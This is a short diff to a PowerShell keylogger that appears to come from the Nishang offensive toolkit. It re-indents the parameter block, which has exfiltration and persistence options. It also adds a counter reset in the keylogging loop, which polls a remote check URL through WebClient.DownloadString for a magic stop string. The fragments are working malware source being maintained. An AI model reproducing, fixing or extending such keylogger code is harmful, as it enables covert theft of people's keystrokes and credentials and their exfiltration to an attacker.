@@ -63,7 +63,7 @@ http://labofapenetrationtester.com/
 https://github.com/samratashok/nishang
 #>
 
-[CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
+    [CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
         [Parameter(Parametersetname="exfil")]
         [Switch]
         $persist,
@@ -110,7 +110,7 @@ https://github.com/samratashok/nishang
         [String]
         $AuthNS = "null"   
    
-)
+    )
 
 
 
@@ -341,6 +341,7 @@ function Keylogger
             $check++
             if ($check -eq 6000)
             {
+                $check = 0
                 $webclient = New-Object System.Net.WebClient
                 $filecontent = $webclient.DownloadString("$CheckURL")
                 if ($filecontent -eq $MagicString)
